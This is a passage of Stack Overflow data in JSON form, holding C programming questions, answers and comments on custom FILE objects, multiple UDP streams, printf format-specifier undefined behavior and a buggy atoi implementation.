href=\"http://stackoverflow.com/help/how-to-ask\">stackoverflow.com/help/how-to-ask</a>"}], "answers": [{"tags": [], "owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "is_accepted": false, "score": 2, "last_activity_date": 1437564660, "creation_date": 1437564660, "answer_id": 31561859, "question_id": 31561761, "link": "https://stackoverflow.com/questions/31561761/standard-file-objects-in-c/31561859#31561859", "title": "Standard FILE objects in c", "body": "<p>Yes, you can use <code>fopen</code> or related functions to open a file, or <code>popen</code> to open a pipe.  They return a <code>FILE*</code> which you can use for I/O.</p>\n\n<ul>\n<li><a href=\"http://man7.org/linux/man-pages/man3/fopen.3.html\" rel=\"nofollow\">fopen reference</a></li>\n<li><a href=\"http://man7.org/linux/man-pages/man3/popen.3.html\" rel=\"nofollow\">popen refernece</a></li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 1307, "user_id": 1515891, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9QW8T.jpg?s=128&g=1", "display_name": "spt025", "link": "https://stackoverflow.com/users/1515891/spt025"}, "is_accepted": false, "score": 0, "last_activity_date": 1437565607, "creation_date": 1437565607, "answer_id": 31562202, "question_id": 31561761, "link": "https://stackoverflow.com/questions/31561761/standard-file-objects-in-c/31562202#31562202", "title": "Standard FILE objects in c", "body": "<p>Yes..\nYou can do this if you are willing to.</p>\n\n<p>Refer to this Link for further reference </p>\n\n<p><a href=\"http://crasseux.com/books/ctutorial/Building-a-library.html\" rel=\"nofollow\">Build your own library in C</a></p>\n"}], "owner": {"reputation": 21, "user_id": 5143268, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-VSU3gE3dv8Q/AAAAAAAAAAI/AAAAAAAAEEM/o1UdgpbKxok/photo.jpg?sz=128", "display_name": "Rckzz", "link": "https://stackoverflow.com/users/5143268/rckzz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 209, "favorite_count": 0, "answer_count": 2, "score": -5, "last_activity_date": 1437565607, "creation_date": 1437564353, "last_edit_date": 1437564524, "question_id": 31561761, "link": "https://stackoverflow.com/questions/31561761/standard-file-objects-in-c", "title": "Standard FILE objects in c", "body": "<p>There are standard FILE objects, stdin, stdout, stderr.</p>\n\n<p>Can I create my own FILE objects similar to the standard FILE objects?</p>\n"}, {"tags": ["c", "sockets", "networking", "linux-kernel", "udp"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1437568063, "post_id": 31561350, "comment_id": 51081839, "body": "more ports, with each port dedicated to a specific incoming stream of UDP packets.    Linux will buffer the UDP packets, so it is unlikely that any packets will be lost within the OS; however, packets can be lost anywhere before that point.  Note: I have seen Linux buffer up to 10 seconds of UDP packets of GPS data."}, {"owner": {"reputation": 8565, "user_id": 1763035, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/wpk6X.jpg?s=128&g=1", "display_name": "Andy Brown", "link": "https://stackoverflow.com/users/1763035/andy-brown"}, "edited": false, "score": 0, "creation_date": 1437638620, "post_id": 31561350, "comment_id": 51116094, "body": "A very expensive (100&#39;s of K$ per year) extremely low latency messaging system that we use at work has a tunable config property that allows you to specify how many UDP ports it listens on. They recommend you profile and tune according to your workload and evironment. Good advice I think."}, {"owner": {"reputation": 27359, "user_id": 1141471, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/t1JZE.png?s=128&g=1", "display_name": "4pie0", "link": "https://stackoverflow.com/users/1141471/4pie0"}, "reply_to_user": {"reputation": 8565, "user_id": 1763035, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/wpk6X.jpg?s=128&g=1", "display_name": "Andy Brown", "link": "https://stackoverflow.com/users/1763035/andy-brown"}, "edited": false, "score": 0, "creation_date": 1437640441, "post_id": 31561350, "comment_id": 51117211, "body": "@AndyBrown System - do you mean program? How is this written? Is this a network driver maybe?"}], "answers": [{"comments": [{"owner": {"reputation": 27359, "user_id": 1141471, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/t1JZE.png?s=128&g=1", "display_name": "4pie0", "link": "https://stackoverflow.com/users/1141471/4pie0"}, "edited": false, "score": 0, "creation_date": 1437569213, "post_id": 31562968, "comment_id": 51082681, "body": "yes, ofcourse datagrams may be lost everywhere, I am interested only in processing performance. Thank you."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "reply_to_user": {"reputation": 27359, "user_id": 1141471, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/t1JZE.png?s=128&g=1", "display_name": "4pie0", "link": "https://stackoverflow.com/users/1141471/4pie0"}, "edited": false, "score": 0, "creation_date": 1437569679, "post_id": 31562968, "comment_id": 51083074, "body": "You said you were interested in &#39;networking performance&#39; and the amount of incoming data. Not a word about processing. Make up your mind."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "reply_to_user": {"reputation": 27359, "user_id": 1141471, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/t1JZE.png?s=128&g=1", "display_name": "4pie0", "link": "https://stackoverflow.com/users/1141471/4pie0"}, "edited": false, "score": 0, "creation_date": 1437646390, "post_id": 31562968, "comment_id": 51121055, "body": "Not a word about the kernel either. I suggest you reword your question."}], "tags": [], "owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "is_accepted": false, "score": 1, "last_activity_date": 1437567603, "creation_date": 1437567603, "answer_id": 31562968, "question_id": 31561350, "link": "https://stackoverflow.com/questions/31561350/handling-of-multiple-udp-streams/31562968#31562968", "title": "Handling of multiple UDP streams", "body": "<p>The more sockets you have, the more socket receive buffers you have, so the more space is available for incoming data.</p>\n\n<p>This suggests that multiple socket may be the better option.</p>\n\n<p>However datagrams can be lost anywhere, not just at the target host.</p>\n"}, {"comments": [{"owner": {"reputation": 27359, "user_id": 1141471, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/t1JZE.png?s=128&g=1", "display_name": "4pie0", "link": "https://stackoverflow.com/users/1141471/4pie0"}, "edited": false, "score": 0, "creation_date": 1437571363, "post_id": 31564242, "comment_id": 51084289, "body": "I am interested here if in the case of a single socket kernel will not start to discard data, while in the case of many sockets the same data spreaded into them would be OK."}, {"owner": {"reputation": 6823, "user_id": 2382728, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/ILv9S.jpg?s=128&g=1", "display_name": "Philip Stuyck", "link": "https://stackoverflow.com/users/2382728/philip-stuyck"}, "reply_to_user": {"reputation": 27359, "user_id": 1141471, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/t1JZE.png?s=128&g=1", "display_name": "4pie0", "link": "https://stackoverflow.com/users/1141471/4pie0"}, "edited": false, "score": 0, "creation_date": 1437571701, "post_id": 31564242, "comment_id": 51084558, "body": "It requires some experiments to really know. In systems where I used this, a queue behind the socket solved many issues."}], "tags": [], "owner": {"reputation": 6823, "user_id": 2382728, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/ILv9S.jpg?s=128&g=1", "display_name": "Philip Stuyck", "link": "https://stackoverflow.com/users/2382728/philip-stuyck"}, "is_accepted": false, "score": 2, "last_activity_date": 1437571230, "last_edit_date": 1437571230, "creation_date": 1437570873, "answer_id": 31564242, "question_id": 31561350, "link": "https://stackoverflow.com/questions/31561350/handling-of-multiple-udp-streams/31564242#31564242", "title": "Handling of multiple UDP streams", "body": "<p>There is no easy answering this question because it all boils down to the processing speed of your threads and how you delegate the work among them.<br>\nIf you think that the udp socket is going to be overwhelmed you can create a queue right behind the udp socket. This queue can grow as large as you allow it to grow. Of course you then use more memory.<br></p>\n\n<p>What you will have then is a consumers/producer paradigm. One thread is putting things in the queue, other threads are taking from the queue.<br></p>\n\n<p>If the processing of the threads is slower than the thread which is filling the queue, and this keeps going for a long time. Your queue is anyhow going to get overrun.</p>\n\n<p>There are frameworks dedicated to the task of multimedia processing. You might want to take a look at gstreamer. <a href=\"http://gstreamer.freedesktop.org/documentation/\" rel=\"nofollow\">http://gstreamer.freedesktop.org/documentation/</a>\nIt has support for RTP and is basically a system that allows to create a pipeline of a datastream which is exactly what you are doing here.<br></p>\n\n<p>You will find that gstreamer has ready made queues that allow to queue up some data somewhere in the pipeline. This anyhow proves to me that something like this is needed when you are processing at high speeds. Though I am not a gstreamer specialist. Gstreamer has building blocks so you can experiment with a pipeline and easily add queueing, remove it and compare the results of the overall pipeline. It does require some studying to get to know the api. It is written in C.</p>\n"}], "owner": {"reputation": 27359, "user_id": 1141471, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/t1JZE.png?s=128&g=1", "display_name": "4pie0", "link": "https://stackoverflow.com/users/1141471/4pie0"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1003, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1437585301, "creation_date": 1437563197, "last_edit_date": 1437585301, "question_id": 31561350, "link": "https://stackoverflow.com/questions/31561350/handling-of-multiple-udp-streams", "title": "Handling of multiple UDP streams", "body": "<p>Let's assume I have <code>m</code> UDP streams uniquely identified by some id (e.g. RTP SSRC). I need to process them in <code>n</code> associated threads and association is <code>1-N</code>, i.e. one UDP stream is processed by one or many threads.</p>\n\n<p>What is the difference in kernel's networking stack performance if I:</p>\n\n<ol>\n<li><p>Start <code>m</code> UDP servers each on different port. Each server processes one stream and pushes it's data to one or more associated threads.</p></li>\n<li><p>Start just one server. All streams are handled by it's single port and this thread pushes each stream data next to one or more associated threads.</p></li>\n</ol>\n\n<p>I think it comes down to the question: is it better to open one single port or many of them, where each will receive proportionally less data?</p>\n\n<p>Is there possibility that single socket may be overwhelmed by the amount of incoming data? Or maybe socket, which is more logical thing in linux kernel than a physical thing, has not so much to do that the data itself, so there is no real difference?</p>\n\n<p>What is the maximum bitrate the single UDP socket (with enlarged buffer) can handle?</p>\n\n<p>I am sure I will best find the answer by browsing of kernel's networking code but maybe someone could give the answer straight away please. Thank you.</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "edited": false, "score": 0, "creation_date": 1437562576, "post_id": 31561108, "comment_id": 51078065, "body": "Why did you use s tag?"}, {"owner": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "edited": false, "score": 4, "creation_date": 1437562653, "post_id": 31561108, "comment_id": 51078116, "body": "It&#39;s UB. Don&#39;t try to understand it. By definition, it can do anything, including working as expected."}, {"owner": {"reputation": 6115, "user_id": 2339452, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FvFTP.jpg?s=128&g=1", "display_name": "Dayal rai", "link": "https://stackoverflow.com/users/2339452/dayal-rai"}, "edited": false, "score": 1, "creation_date": 1437562798, "post_id": 31561108, "comment_id": 51078220, "body": "if you do not ignore warnings then you can easily see that it is not right."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1437563054, "post_id": 31561108, "comment_id": 51078387, "body": "[on a lighter note] <code>printing int in c by %s in printf</code>--- shoot at your foot with a shotgun, you&#39;ll get the same effect as the previous. :-)"}, {"owner": {"reputation": 709, "user_id": 2781244, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/ifedP.jpg?s=128&g=1", "display_name": "Waqas Shabbir", "link": "https://stackoverflow.com/users/2781244/waqas-shabbir"}, "edited": false, "score": 0, "creation_date": 1437563252, "post_id": 31561108, "comment_id": 51078521, "body": "@Priyal Kumar, Can you please share your output of above code?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1437563897, "post_id": 31561108, "comment_id": 51078922, "body": "Please no unreadable screencopys. Post your source code and your output in text form."}, {"owner": {"reputation": 55, "user_id": 4393045, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/097f90a9748cee932804c0eb0f5aa409?s=128&d=identicon&r=PG&f=1", "display_name": "Tuesday", "link": "https://stackoverflow.com/users/4393045/tuesday"}, "edited": false, "score": 0, "creation_date": 1437574223, "post_id": 31561108, "comment_id": 51086617, "body": "there is not even any warning by the compiler :)"}, {"owner": {"reputation": 55, "user_id": 4393045, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/097f90a9748cee932804c0eb0f5aa409?s=128&d=identicon&r=PG&f=1", "display_name": "Tuesday", "link": "https://stackoverflow.com/users/4393045/tuesday"}, "edited": false, "score": 0, "creation_date": 1437574304, "post_id": 31561108, "comment_id": 51086701, "body": "no, with %c it&#39;s printing character instead"}, {"owner": {"reputation": 55, "user_id": 4393045, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/097f90a9748cee932804c0eb0f5aa409?s=128&d=identicon&r=PG&f=1", "display_name": "Tuesday", "link": "https://stackoverflow.com/users/4393045/tuesday"}, "edited": false, "score": 0, "creation_date": 1437574350, "post_id": 31561108, "comment_id": 51086733, "body": "Code: void main() {    int a=6;    printf(&quot;%s&quot;,a);  }                                                                                                                   /*OUTPUT:- Borland C++ - Copyright 1991 Borland Inc */"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437664585, "post_id": 31561108, "comment_id": 51134912, "body": "there are only two correct (and one optional) way to declare the main function.  All versions have a &#39;int&#39; return type.   for your program, suggest using: &#39;int main( void )&#39;   Then, at the end of the program insert the statement: &#39;return 0;&#39;"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437664848, "post_id": 31561108, "comment_id": 51135140, "body": "When compiling, enable all warnings, then fix the warnings. Use a modern compiler.   for the posted code, the following warning is output &quot;&quot;warning: format &quot;%s&quot; expects argument of type &#39;char *&#39; but argument 2 has type &#39;int&#39; {-Wformat=]&quot;"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437665133, "post_id": 31561108, "comment_id": 51135353, "body": "this: &#39;Borland C++ - Copyright 1991 Borland Inc&#39; is what Borland compiler places at address 6 in the executable file"}], "answers": [{"tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": true, "score": 2, "last_activity_date": 1437562990, "last_edit_date": 1437562990, "creation_date": 1437562655, "answer_id": 31561163, "question_id": 31561108, "link": "https://stackoverflow.com/questions/31561108/printing-int-in-c-by-s-in-printf/31561163#31561163", "title": "printing int in c by %s in printf", "body": "<p>You are using wrong specifier for <code>int</code> data type. Its undefined behavior. Any thing could happen.  </p>\n\n<p><a href=\"http://c-faq.com/ansi/undef.html\" rel=\"nofollow\"><strong>Undefined Behavior:</strong></a> </p>\n\n<blockquote>\n  <p>Anything at all can happen; the Standard imposes no requirements. The program may fail to compile, or it may execute incorrectly (either crashing or silently generating incorrect results), or it may fortuitously do exactly what the programmer intended.</p>\n</blockquote>\n"}, {"comments": [{"owner": {"reputation": 33210, "user_id": 211659, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/31c59c3ebec3e38517c37e8b1d5cb9de?s=128&d=identicon&r=PG", "display_name": "\u0160imon T&#243;th", "link": "https://stackoverflow.com/users/211659/%c5%a0imon-t%c3%b3th"}, "edited": false, "score": 4, "creation_date": 1437562817, "post_id": 31561166, "comment_id": 51078236, "body": "It&#39;s actually extremely common to check <code>printf</code> and <code>scanf</code> formats against the actual parameters. But Borland is so ancient that it is unlikely that it will check anything."}], "tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 4, "last_activity_date": 1437562895, "last_edit_date": 1437562895, "creation_date": 1437562656, "answer_id": 31561166, "question_id": 31561108, "link": "https://stackoverflow.com/questions/31561108/printing-int-in-c-by-s-in-printf/31561166#31561166", "title": "printing int in c by %s in printf", "body": "<p>Your program behaviour is <em>undefined</em> since <code>%s</code> is not a valid format specifier for an <code>int</code>.</p>\n\n<p>Exactly why it gives you the values it does is down to conjecture. The compiler also reserves the right to eat your cat. And your dog given that <code>void main()</code> is not compliant with later C standards.</p>\n\n<p>C intentionally does not guard against your doing this as that would compromise the performance of the language. It's difficult (although not impossible as C is statically typed) for a compiler to warn you of this.</p>\n"}, {"tags": [], "owner": {"reputation": 4791, "user_id": 1609614, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lvIBD.jpg?s=128&g=1", "display_name": "Ari0nhh", "link": "https://stackoverflow.com/users/1609614/ari0nhh"}, "is_accepted": false, "score": 3, "last_activity_date": 1437563107, "creation_date": 1437563107, "answer_id": 31561313, "question_id": 31561108, "link": "https://stackoverflow.com/questions/31561108/printing-int-in-c-by-s-in-printf/31561313#31561313", "title": "printing int in c by %s in printf", "body": "<p>It shows you not name of the company. Compiler treats <code>6</code> as pointer and prints character data from that address until it finds escape sequence <code>\\0</code>\nIf you compile this code with different compiler, you will most likely get different results, thats why it is called undefined behavior, as it been rightfully pointed in other answers. </p>\n"}, {"tags": [], "owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "is_accepted": false, "score": 3, "last_activity_date": 1437564190, "last_edit_date": 1437564190, "creation_date": 1437563143, "answer_id": 31561325, "question_id": 31561108, "link": "https://stackoverflow.com/questions/31561108/printing-int-in-c-by-s-in-printf/31561325#31561325", "title": "printing int in c by %s in printf", "body": "<p>First of all you should really start to use the minimum standard.\nThere are a lot of code missing in here and of course you are using an invalid format specifier.\nYou started with an <code>int</code> but you try to print it as a String (%d vs %s)\nAlso your Main Function it's not ok and the return type is missing too.\nThis is what you need:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint main(void){\n\n    int a=6;\n\n    printf(\"%d\",a);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 55, "user_id": 4393045, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/097f90a9748cee932804c0eb0f5aa409?s=128&d=identicon&r=PG&f=1", "display_name": "Tuesday", "link": "https://stackoverflow.com/users/4393045/tuesday"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1752, "favorite_count": 0, "accepted_answer_id": 31561163, "answer_count": 4, "score": -4, "last_activity_date": 1437564190, "creation_date": 1437562509, "last_edit_date": 1437562555, "question_id": 31561108, "link": "https://stackoverflow.com/questions/31561108/printing-int-in-c-by-s-in-printf", "title": "printing int in c by %s in printf", "body": "<p><a href=\"https://i.stack.imgur.com/Zzv8S.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Zzv8S.png\" alt=\"Compiled in Borland C++ compiler\"></a></p>\n\n<blockquote>\n  <p>The compiler doesn't mark it as any error.</p>\n</blockquote>\n\n<ul>\n<li>I know that it's wrong,</li>\n<li><p>but I want to know why it's showing the name of the company.</p>\n\n<ol>\n<li>And it doesn't show this message if I type any value less than 4,</li>\n<li>it gives different outputs for different such values, try some\nvalues like 50, 100,etc.</li>\n</ol>\n\n<p>Why it's showing such strange outputs.</p></li>\n</ul>\n\n<h2>Here is the program.</h2>\n\n<pre><code>void main()\n{\n\n  int a=6;\n\n  printf(\"%s\",a);\n\n}\n</code></pre>\n"}, {"tags": ["c", "atoi"], "comments": [{"owner": {"reputation": 4224, "user_id": 3383213, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/91b489041a73ecbb02cc26af19b5f664?s=128&d=identicon&r=PG&f=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/3383213/himanshu"}, "edited": false, "score": 1, "creation_date": 1437562242, "post_id": 31560778, "comment_id": 51077825, "body": "The thing is when you have -ve number it is not going inside while loop. you should check if first character is <code>-</code>, you should do <code>i++</code> so that it can get next character."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1437562690, "post_id": 31560778, "comment_id": 51078150, "body": "Apart from being the source of your problem, looping twice is also a huge waste. Oh and you should really pass a <code>const char *</code> as such a function is not expected to change the string content. Look how <a href=\"http://coliru.stacked-crooked.com/a/a08491d633f7fb7e\" rel=\"nofollow noreferrer\">it simplifies everything with just one loop</a>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1437563090, "post_id": 31560778, "comment_id": 51078413, "body": "Forgot to include the check for digit, of course ist should <a href=\"http://coliru.stacked-crooked.com/a/5327f86dd3fd7388\" rel=\"nofollow noreferrer\">look like this</a>"}], "answers": [{"tags": [], "owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "is_accepted": false, "score": 3, "last_activity_date": 1437562235, "creation_date": 1437562235, "answer_id": 31561018, "question_id": 31560778, "link": "https://stackoverflow.com/questions/31560778/why-doesnt-my-atoi-implementation-work-with-negative-numbers/31561018#31561018", "title": "Why doesn&#39;t my atoi implementation work with negative numbers?", "body": "<p>the second while loop breaks if <code>str[0]</code> is <code>'-'</code>.</p>\n\n<pre><code>while(str[i] != '\\0')\n{\n    if (str[i] == '-')\n        sign = -sign;\n    i++;\n}\n</code></pre>\n\n<p>should be</p>\n\n<pre><code>if (str[0] == '-')\n{\n    sign = -1;\n    str++;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4224, "user_id": 3383213, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/91b489041a73ecbb02cc26af19b5f664?s=128&d=identicon&r=PG&f=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/3383213/himanshu"}, "edited": false, "score": 0, "creation_date": 1437562570, "post_id": 31561087, "comment_id": 51078060, "body": "No need to use first <code>while</code> loop. you can use <code>if</code> instead. bcz there will be only one <code>-</code> character."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 4224, "user_id": 3383213, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/91b489041a73ecbb02cc26af19b5f664?s=128&d=identicon&r=PG&f=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/3383213/himanshu"}, "edited": false, "score": 1, "creation_date": 1437562630, "post_id": 31561087, "comment_id": 51078104, "body": "@Himanshu: Yes, but I was working fro OP&#39;s code. This will parse &quot;--23&quot; as positive 23. The way it was coded in the original post, I&#39;m not sure whether that was intended."}, {"owner": {"reputation": 4224, "user_id": 3383213, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/91b489041a73ecbb02cc26af19b5f664?s=128&d=identicon&r=PG&f=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/3383213/himanshu"}, "edited": false, "score": 0, "creation_date": 1437562767, "post_id": 31561087, "comment_id": 51078201, "body": "@M Oehm, nice thought. 2 -ve sign."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 4224, "user_id": 3383213, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/91b489041a73ecbb02cc26af19b5f664?s=128&d=identicon&r=PG&f=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/3383213/himanshu"}, "edited": false, "score": 0, "creation_date": 1437562942, "post_id": 31561087, "comment_id": 51078315, "body": "@Himanshu: Well, two minus signs is a bit silly, really. An <code>if</code> is enough, but the code shoul probably strip leading white space and recognise a <code>+</code> at the beginning, too."}], "tags": [], "owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "is_accepted": false, "score": 1, "last_activity_date": 1437562465, "creation_date": 1437562465, "answer_id": 31561087, "question_id": 31560778, "link": "https://stackoverflow.com/questions/31560778/why-doesnt-my-atoi-implementation-work-with-negative-numbers/31561087#31561087", "title": "Why doesn&#39;t my atoi implementation work with negative numbers?", "body": "<p>After you have scanned the string for minus signs, you reset <code>i</code> to zero, but <code>str[0]</code> isn't a valid digit, because it's a minus sign.</p>\n\n<p>You can change the first loop to advance past the first minus sign and the start parsing the numerical value from where the first loop left off:</p>\n\n<pre><code>int ft_atoi(char *str)\n{\n    int i = 0;\n    int sign = 1;\n    int val = 0;\n\n    while (str[i] == '-') {\n        sign = -sign;\n        i++;\n    }\n\n    while(str[i] &gt;= '0' &amp;&amp; str[i] &lt;= '9')\n    {\n        int nbr = (int) (str[i] - '0');\n\n        val = (val * 10) + nbr;\n        i++;\n    }\n\n    return (val * sign);\n}\n</code></pre>\n\n<p>(There's no need to check that <code>str[i]</code> isn't the null character, because if it is a minus sign or a digit, it can't be the null character. The check is useful for testing negatives, however, e.g. when testing that some character isn't a minus.)</p>\n"}, {"tags": [], "owner": {"reputation": 351, "user_id": 4428647, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/aC55j.png?s=128&g=1", "display_name": "rtroulak", "link": "https://stackoverflow.com/users/4428647/rtroulak"}, "is_accepted": false, "score": 0, "last_activity_date": 1437562530, "creation_date": 1437562530, "answer_id": 31561118, "question_id": 31560778, "link": "https://stackoverflow.com/questions/31560778/why-doesnt-my-atoi-implementation-work-with-negative-numbers/31561118#31561118", "title": "Why doesn&#39;t my atoi implementation work with negative numbers?", "body": "<p>you can just <code>str++;</code> in your if when str is negative</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint ft_atoi(char *str)\n{\n    int i;\n    int sign;\n    int val;\n    int nbr;\n\n\n\n       i = 0;\n        sign = 1;\n        val = 0;\n        nbr = 0;\n        while(str[i] != '\\0')\n        {\n            if (str[i] == '-')\n            {\n\n                sign = -sign;\n                str++;\n            }\n            i++;\n        }\n        i = 0;\n        while(str[i] &gt;= '0' &amp;&amp; str[i] &lt;= '9' &amp;&amp; str[i] != '\\0')\n        {\n            nbr = (int) (str[i] - '0');\n            val = (val * 10) + nbr;\n            i++;\n        }\n        i++;\n        return (val * sign);\n    }\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 5143024, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/37dca49a34310f278c1d056979fb16eb?s=128&d=identicon&r=PG&f=1", "display_name": "Tom San", "link": "https://stackoverflow.com/users/5143024/tom-san"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3155, "favorite_count": 